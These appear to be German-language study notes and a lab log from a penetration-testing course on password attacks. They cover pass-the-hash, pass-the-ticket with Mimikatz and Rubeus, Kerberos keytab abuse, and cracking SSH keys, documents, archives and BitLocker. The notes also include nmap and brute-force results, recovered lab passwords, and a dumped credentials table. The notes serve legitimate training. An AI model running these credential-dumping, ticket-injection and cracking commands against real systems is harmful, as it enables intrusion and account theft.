	- Wenn SMB blockiert ist oder wir keine Admin Rechte haben koennen wir alternative Protokolle verwenden um uns mit der Target Machine zu verbinden

- Pass the Hash with RDP(Linux):
	- Wir koennen einen PtH durchfuehren um eine GUI zu bekommen mit Tools wie xfreerdp
	- Damit dieser Angriff funktioniert nur wenn Restricted Admin Mode aktiviert ist
	- Restricted Admin Mode kann aktiviert werden wenn DisableRestrictedAdmin unter HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa auf 0 gesetzt worden ist
	- Per CMD:
		- reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

- Pass the Hash Using RDP:
	- xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

- UAC Limits Pass the Hash for Local Accounts:
	- UAC (User Account Control) schraenkt die Moeglichkeiten lokaler User zur Durchfuehrung von Remote Admin Operation ein
	- HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy gleich 0 ist ist der built-in local admin account (RID-500,"Administrator") der einzige User der remote Admin Operationen durchfuehren kann. Wenn er auf 1 gesetzt wird koennen auch andere local Admins remote Admin Operationen durchfuehren

- Wenn wir einen Domain Account mit admistrative Rechte haben koennen wir immernoch Pass the Hash verwenden. Einfacher ist LocalAccountTokenFilterPolicy (https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167)

- Mimikatz:
	- privilege::debug
	- sekurlsa::logonpasswords

2. Pass the Ticket(PtT) from Windows:
- Ein andere Methode fuer seitliche Bewegung in einer Active Directory Umgebung heisst Pass the Ticket(PtT) Angriff
- Hier wird von Kerberos ein Ticket gestolen um uns damit zu authentifizieren

- Kerberos Protocol Refresher:
	- Das Kerberos Authenfikation System ist ticket basiert
	- Kerberos gibt das Passwort nicht an Services weiter sondern ein ticket
		- TGT:
			- Ticket Granting Ticket ist das erste Ticket von Kerberos
			- Erlaubt dem Client das Einholen von weiteren Kerberos Tickets
		- TGS:
			- Ticket Granting Service wird vom User eingeholt wenn dieser ein Service nutzen will
			- Ticket weisen Services die User Identitaet nach
	- Damit ein User ein TGT anfragen kann muss er sich beim domain controller authentifizieren indem er den derzeitigen Zeitstempel mit dem Passwort Hash verschluesselt

- Pass the Ticket(PtT) Attack:
	- Wir benoetigen ein Kerberos Ticket fuer einen PtT Angriff
	- Methoden um Kerberos Tickets zu erhalten sind Mimikatz und Rubeus

- Harvesting Kerberos Tickets from Windows:
	- Tickets werden von dem LSASS Prozess gespeichert
	- Als ein lokaler User kann man nur die eigenen Tickets bekommen, ein lokaler Admin kann alle Ticket bekommen
	- Mimikatz:
		- In Mimikatz gibt es das Modul: sekurlsa::tickets /export
		- Die Auageb ist eine .kirbi Datei die das Ticket erhaelt
		- Wenn Tickets mit $ enden dem Computerkonto entsprechen
		- Ticketnamen bstehen aus Usernamen mit einem @ und dem Service Namen und der Domaine
		- [randomvalue]-username@service-domain.
	
	- Rubeus:
		- Exportet alle Ticket auf dem System
		- Rubeus.exe dump /nowrap

- Pass the Key or OverPass the Hash:
	- PtH Angriffe benoetigen ein NTLM Hash den wir in Kerberos nicht haben
	- Pass the Key oder OverPass the Hash convertieren ein Hash in einen Ticket-Granting System
	- https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18
	- Um ein Ticket zu erstellen koennen wir mit Mimikatz das Modul sekurlsa::ekeys verwenden
	- Damit haben wir Zugang zu den AES256_HMAC und RC4_HMAC Keys um OverPass the Hash oder Pass the Hash Angriffe mit Mimikatz, Rubeus durchzufuehren

	- Mimikatz - Pass the Key or OverPass the Hash:
		- sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
		- Erstellt ein CMD Fenster mit dem wir Services mit dem Ziel User verwenden koennen

	- Rubeus - Pass the Key or OverPass the Hash:
		- In Rubeus verwenden wir das Modoul asktgt
		- Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap

- Pass the Ticket(PtT):
	- Wenn wir Kerberos Tickets haben koennen wir uns damit durch die Umgebung bewegen
	- Mit dem Rubeus Parameter /ptt koennen wir ein Ticket einreichen
		- Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
	- Ein andere Weg ist mit einer .kirbi Datei
		- Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
	
	- Convert .kirbi to Base64 Format:
		- [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi")

	- Pass the Ticket - Base64 Format:
		- Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>

	- Mimikatz - Pass the Ticket:
		- In Mimikatz koennen wir das Modul kerberos:ptt werden mit der .kirbi Datei
		- kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

- Pass the Ticket with PowerShell Remoting (Windows):
	- PowerShell Remoting erlaubt uns Befehle auf einem Remote PC auszufuehren
	- PowerShell Remoting Listener laufen auf HTTP(5985) und HTTPS(5986)
	- Um eine PowerShell Remoting Session auf dem remote Computer haben wollen benoetigen wir admin Rechte oder muss ein Mitglied von Rmote Management User Group sein

- Mimikatz - PowerShell Remoting with Pass the Ticket:
	- Mit sekurlsa::tickets /export koennen wir ein Ticket exportieren
	- kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

- Rubeus - PowerShell Remoting with Pass the Ticket:
	- Rebeus hat einen Option namens createnetonly mit dem eine Logon Session erstellt werden kannt
	- Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

- Rubeus - Pass the Ticket for Lateral Movement:
	- Mit der Option /ptt koennen wir das TGT Ticket in derzeitige Session importieren

3. Pass the Ticket(PtT) from Linux:
- Linux Computer koennen sich mit Active Directory verbinden um eine zentrale Verwaltung zu erlauben
- Der Linux Computer verwendet Kerberos Authenfikation fuer AD

- Kerberos on Linux:
	- In den meisten Linux Maschinen der die Kerberos Ticket in einem ccache File in im /tmp Verzeichnis gespeichert mit der Umgebungsvariable KRB5CCNAME
	- Die Datei ist geschuetzt
	- Es gibt ausserdem keytab Dateien mit denen man sich ohne Passwort authentifizieren kann

- Linux Auth via Port Forward:
	- ssh david@inlanefreight.htb@10.129.204.23 -p 2222

- Identifying Linux and Active Directory Integration:
	- Auf der Linux Maschine koennen wir realm verwenden um zu sehen ob der Host zu einer Domain gehoert
	- realm list
	- Wenn realm nicht verfuegbar ist, kann sssd oder winbind verwendet werden
	- ps -ef | grep -i "winbind\|sssd"

- Finding Kerberos Tickets in Linux:
	- Wir muessen immer noch Passwort Dateien suchen
	- Finding Keytab Files:
		- Ein guter Ansatz ist eine Datei welches keytab enthaelt
		- find / -name *keytab* -ls 2>/dev/null

	- Identifying Keytab Files in Cronjobs:
		- crontab -l

- Finding ccache Files:
	- Eine Credential cache oder ccache Datei enthaelt Kerberos Credentials waehrend der User Session 
	- Wenn ein User sich authentifiziert wird eine ccache Datei mit der Ticket Information erstellt
	- ccache Datei ansehen:
		- env | grep -i krb5
	- Sonst koennen wir in /tmp mit ls -la nach ccache Dateien suchen

- Abusing KeyTab Files:
	- Mit einer KeyTab Datei koennen wir uns als ein anderer User ausgeben mit kinit
	- klist ist eine andere Anwendung mit der man mit Kerberos in Linux interagieren kann
	- Diese Anwendung liest die Information aus der Keytab Datei
	- klist -k -t 

- Impersonating a User with a keytab:
	- klist 
	- kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

- Keytab Extract:
	- Die 2 Methode ist Keytab Extract
	- Wir koennen Daten aus .keytab Dateien, und anderen Dateien suchen ueber Kerberos
	- python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
	- Wenn es sich um ein NTLM Hash handelt koennen wir den mit Hashcat /JohntheRipper knacken
	- Um uns dann mit su als dieser User einzuloggen

###################################################################################################
Cracking Files
1. Protected Files:
- Das verschluesseln von Dateien ist immer noch wenig praktiziert
- Noch heute sind Emails von Job Bewerbungen, Account Informationen und andere Kontakte immernoch unverschlusselt
- GDPR setzt vorraus das alle persoenlichen Daten von Kunden verschluesselt sind

- Hunting for Encoded Files:
	- Manche Dateiendungen koennen entschluesselt/verschluesselt vermuten lassen
	- https://fileinfo.com/filetypes/encoded
	- for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

- Hunting for SSH Keys:
	- grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
	- Die meisten SSH Keys sind verschluesselt, dies koennen wir am Header sehen

- Encrypted SSH Keys:
	- cat /home/cry0l1t3/.ssh/SSH.private
	- Verschluesselte SSH Keys sind mit einer Passphrase gesichert
	- Dennoch sind manche nicht vorsichtig genug, da auch AES-128-CBC leicht gebrochen werden koennen

- Cracking with John:
	- John the Ripper hat viele verschiedene Scripts um Hashes zu brechen
	- locate *2john*
	- Mit dem Tool ssh2john.py koennen wir einen Hash fuer SSH Keys generieren
	- Mit john --wordlist=rockyou.txt ssh.hash laesst sich der Hash brechen
	- Und mit john ssh.hash --show laesst sich das Password anzeigen

- Cracking Documents:
	- Manchmal sind auch Dokumente verschluesselt hier koennen wir ebenso John the Ripper verwenden
	- Mit dem Script office2john.py koennen wir das Passwort mitdem das Dokument verschluesselt ist anzeigen lassen
	- office2john.py Protected.docx > protected-docx.hash
	- john --wordlist=rockyou.txt protected-docx.hash
	- john protected-docx.hash --show

- PDF Cracken:
	- pdf2john.py PDF.pdf > pdf.hash
	- john --wordlist=rockyou.txt pdf.hash
	- john pdf.hash --show

10.129.11.39
ssh kira@10.129.11.39
Passwort: L0vey0u1!
id_rsa" SSH key

2. Protected Archives:
- Ausser eigenstaendigen Dateien gibt es auch andere Dateien die noch andere Dateien enthalten
- Die Formate werden Archive oder kompressete Dateien genannt
- Wenn wir einer Firma eine Analyse in mehreren Formaten schicken wollen dann koennen wir diese Archivieren als tar, zip, gz usw
- https://fileinfo.com/filetypes/compressed

- Download All File Extensions:
	- curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
	- Viele der Archive unterstuetzen Passwort Verschluesselung

- Cracking Archive:
	- Wir koenen ebenso Archive brechen die mit einem Passwort geschuetz sind

	- Cracking ZIP:
		- Using zip2john:
			- zip2john ZIP.zip > zip.hash
			- cat zip.hash
		- Using John:
			- john --wordlist=rockyou.txt zip.hash
			- jphn zip.hash --show

- Cracking OpenSSL Encrypted Archives:
	- Mit dem Tool file koennen wir mehr Informationen ueber das Datei Format herausfinden
	- file GZIP.gzip 
	
	- Using a for-loop to Display Extracted Contents:
		- for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done

- Cracking BitLocker Encrypted Drives:
	- BitLocker ist ein Verschluesselungs Programm das fuer Windows programmiert worden ist

	- Using bitlocker2john:
		- bitlocker2john -i Backup.vhd > backup.hashes
		- grep "bitlocker\$0" backup.hashes > backup.hash
		- cat backup.bash

	- Using hashcat to Crack backup.hash:
		- hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt - o backup.cracked
		- cat backup.cracked
ssh kira@10.129.193.53
Passwort: L0vey0u1!

###################################################################################################
Skill Assessment
1. Password Attacks Lab - Easy:
##
nmap -sV -sC 10.129.202.219
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-18 00:23 GMT
Nmap scan report for 10.129.202.219
Host is up (0.062s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.04 seconds

##
hydra -L username.list -P password.list ftp://10.129.202.219 -t 32
Login: mike
Password: 7777777

##
SSH Key id_rsa
id_rsa:7777777
ssh -i id_rsa mike@10.129.202.219

##
History
7  analysis.py -u root -p dgb6fzm0ynk@AME9pqu


2. Password Attacks Lab - Medium:1
Target: 10.129.202.221
#########
nmap -sV -sC 10.129.202.221
	Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-18 23:02 GMT
	Nmap scan report for 10.129.202.221
	Host is up (0.055s latency).
	Not shown: 997 closed tcp ports (conn-refused)
	PORT    STATE SERVICE     VERSION
	22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
	|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
	|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
	139/tcp open  netbios-ssn Samba smbd 4.6.2
	445/tcp open  netbios-ssn Samba smbd 4.6.2
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

	Host script results:
	| smb2-security-mode: 
	|   3.1.1: 
	|_    Message signing enabled but not required
	| smb2-time: 
	|   date: 2023-03-18T23:03:02
	|_  start_date: N/A
	|_nbstat: NetBIOS name: SKILLS-MEDIUM, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 19.84 seconds

#########
SMB 
hydra -L user.list -P password.list smb://10.129.202.221
crackmapexec smb 10.129.202.221 -u user.list -p password.list --shares
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\john:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\dennis:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\chris:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\cassie:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\admin:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\root:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\sysadmin:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\sysadm:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\svc:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\administrator:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\helpdesk:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\reception:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\finance:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\its:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\ict:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\hr:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\servicedesk:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\guest:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\aspnet:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\security:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\payroll:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\helpassistant:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\backupexec:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\webmaster:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\training1:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\training:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\support:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\sqlservice:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\procurement:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\pensions:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\governors:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\boardroom:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\backup:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\audit1:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\weddings:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\website:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\websense:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\weather:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\voicemail:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\triage:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\transport:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\translations:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\trainingroom:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\training5:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\training4:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\training3:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\training2:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\traffic:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\template:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\tempadmin:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\stores:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\sqldebugger:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\social:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\scanuser:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\scanner:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\scan:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\salesinfo:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\safety:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\roadsafety:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\recovery:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\johanna:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\qa:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\oracle:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\operator:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\office:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\no-reply:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\noreply:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\travel:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\myaccount:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\membership:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\localadmin:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\licensing:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\kira:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\mike:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\library:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\jobs:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\itsupport:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\ithelpdesk:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\invoices:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\internalcomms:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\information:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\info:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\hrservices:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\goodsin:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\ftpuser:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\facebook:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\enquiries:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\employee:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\dtadmin:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\conference:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\compliance:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\competitions:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\citrix:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\careline:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\careers:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\besadmin:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\audit4:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\audit3:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\audit2:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\archive:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\adc:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\accountspayable:123456'
[+] 10.129.202.221:445    - 10.129.202.221:445 - Success: '.\:123456' Guest


sudo crackmapexec smb 10.129.43.152 -u "root" -p "123456" --shares

SMB         10.129.202.221  445    SKILLS-MEDIUM    [*] Windows 6.1 Build 0 (name:SKILLS-MEDIUM)
SMB         10.129.202.221  445    SKILLS-MEDIUM    [+] \root:123456 
SMB         10.129.202.221  445    SKILLS-MEDIUM    [+] Enumerated shares
SMB         10.129.202.221  445    SKILLS-MEDIUM    Share           Permissions     Remark
SMB         10.129.202.221  445    SKILLS-MEDIUM    -----           -----------     ------
SMB         10.129.202.221  445    SKILLS-MEDIUM    print$                          Printer Drivers
SMB         10.129.202.221  445    SKILLS-MEDIUM    SHAREDRIVE      READ            SHARE-DRIVE
SMB         10.129.202.221  445    SKILLS-MEDIUM    IPC$                            IPC Service (skills-medium server (Samba, Ubuntu))




smbclient -U root \\\\10.129.43.152\\SHAREDRIVE
get Docs.zip
Password:Destiny2022!
Documentation.docx:987654321
1. Steps to build your own inlane installation

1. Make sure you met all the above prerequisites, especially the Subversion client
2. Checkout the inlane source code. More instructions here.
3. Follow the instructions in Configure the inlane Deployment plugin. Ensure that you also have the profile with the id configure set-up in your settings.xml and also that it is part of the active profiles. Here is the relevant excerpt from the settings.xml.example from within inlane ́s project root folder:

<profiles>
...
<profile>
<id>configure</id>
<properties>
<inlane.configure.active>true</inlane.configure.active>
<inlane.configure.databaseType>mysql</inlane.configure.databaseType>
<inlane.configure.databaseUrl>jdbc:mysql://localhost/inlane?useUnicode=true&amp;characterEncoding=
UTF-8&amp;useServerPrepStmts=false</inlane.configure.databaseUrl>
<inlane.configure.databaseUsername>root</inlane.configure.databaseUsername>
<inlane.configure.databasePassword></inlane.configure.databasePassword>
<inlane.configure.localIp>10.129.200.21</inlane.configure.localIp>
<inlane.deploy.processingServer>true</inlane.deploy.processingServer>
</properties>
</profile>
...
</profiles>
<activeProfiles>
...
<activeProfile>configure</activeProfile>
</activeProfiles>

You need to change the settings with the ones you would enter in the inlane Configuration Wizard.

4. In the main directory, type:

mvn install inlane:configure

This should compile and deploy into your local repository all of inlane, deploy and install everything in the application server configured in your settings.xml file. A purely indicative time of initial compilation time (including all dependency download) is about an hour with GWT compilation included.



5. Point your browser to http://localhost:8080/cms (in case you have not chosen other options in the settings.xml parameters inlane.deploy.war.dirName and inlane.deploy.war.servletPath).

Root password is jason:C4mNKjAtL2dydsYa6

6. Create your first virtual site and enjoy

7. Alternatively if you want to test inlane's configuration from scratch, simply add the configwizard-webapp module in your root pom.xml, in order to have something like

<module>configwizard-webapp</module>

and then simply do

mvn install

In this case you will have to point your browser to http://localhost:8080/config the first time then afterwards just head to http://localhost:8080/cms as usual
Change to the tomcat/bin and run the servlet container (launch startup.bat or startup.sh depending on your platform). Follow the instructions on-screen to configure inlane. Note that at some point it will ask for database settings. You should have an existing database already setup. We recommend under Linux either
PostgreSQL or MySQL. Under Windows the best solution is MySQL. 

Create your first virtual site and enjoy.


##
ssh jason@10.129.188.56
Root password is jason:C4mNKjAtL2dydsYa6


##
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

File:  /etc/alternatives/my.cnf

File:  /etc/mysql/debian.cnf

File:  /etc/mysql/mysql.conf.d/mysqld.cnf
user		= mysql

File:  /etc/mysql/mysql.conf.d/mysql.cnf

File:  /etc/mysql/conf.d/mysqldump.cnf

File:  /etc/mysql/conf.d/mysql.cnf

File:  /etc/mysql/my.cnf

File:  /etc/mysql/mysql.cnf

File:  /etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /usr/share/ssl-cert/ssleay.cnf


mysql -u jason -p
C4mNKjAtL2dydsYa6

SHOW DATABASES;
USE users;
SHOW TABLES;
mysql> select * from creds;
+-----+--------------------+----------------+
| id  | name               | password       |
+-----+--------------------+----------------+
|   1 | Hiroko Monroe      | YJE25AGN4CX    |
|   2 | Shelley Levy       | GOK34QLM1DT    |
|   3 | Uriel Velez        | OAY05YXS1XN    |
|   4 | Vanna Benton       | EAU86WAY1BY    |
|   5 | Philip Morales     | ONC53GFI2ID    |
|   6 | Joshua Morgan      | AHJ46CDW4LH    |
|   7 | Hadley Hanson      | YVD16TIY3QI    |
|   8 | Branden Moses      | ZBE71RLJ5HN    |
|   9 | Pandora Sears      | WYP33WEF5GY    |
|  10 | Orla Lambert       | MLZ15XKR8SF    |
|  11 | Maite Moran        | FOS06OOU2DF    |
|  12 | Cassandra Mccarthy | SIB53CEH5DE    |
|  13 | Leroy Sullivan     | HIC68RBH5EI    |
|  14 | Wyoming Quinn      | LJM77SJC6BN    |
|  15 | Asher Wise         | HHP00OHN8OD    |
|  16 | Shelby Garrison    | SOI55QEP2QC    |
|  17 | Garth Landry       | YOX30FPX2UK    |
|  18 | Cailin Lang        | VYE12SKJ3BG    |
|  19 | Tyrone Gross       | GCM52PLH8LH    |
|  20 | Moana Bernard      | EMK37PGI1BC    |
|  21 | Nell Forbes        | YXY78WCW4GX    |
|  22 | Acton Mccormick    | RSI82CFW9QR    |
|  23 | Odessa Knapp       | CXR22UOP5PV    |
|  24 | Gary Phelps        | KDN93TNB6IB    |
|  25 | Jonah Byrd         | GWK11PET1YK    |
|  26 | Lewis Clements     | ACJ89KMH8IX    |
|  27 | Hasad Dejesus      | GSH56VRQ3FD    |
|  28 | Naomi Guerra       | YJY12IMO3YJ    |
|  29 | Renee Levine       | UAT22NOU6JJ    |
|  30 | Dieter Terry       | KPE74PKB7BE    |
|  31 | Lucas Cooper       | JQY67QCL3SG    |
|  32 | Reece Cherry       | TGV05UOE4MW    |
|  33 | Len Olsen          | SQT66ETU2ML    |
|  34 | Amir Booth         | SNA73SNK1CZ    |
|  35 | Logan Burnett      | BDY84TGX7WC    |
|  36 | Quinn Mcintyre     | UEL46HQC8PI    |
|  37 | Harding Garrison   | MUT33ERW8PN    |
|  38 | Addison Ellison    | RYR75LXH4WI    |
|  39 | Anne Rose          | IOI62GUK7KK    |
|  40 | Alika Richmond     | GUK64BKH7NJ    |
|  41 | Kennan Hopkins     | AKE20VJV3TK    |
|  42 | Katell Pace        | KDK46LGC3TS    |
|  43 | Shoshana Murray    | TDX83THW8CG    |
|  44 | Erasmus Brewer     | MBN41SYM4SC    |
|  45 | Lewis Bryan        | DDI16XVP2LF    |
|  46 | Yoko Bryan         | ISE37BPH4HE    |
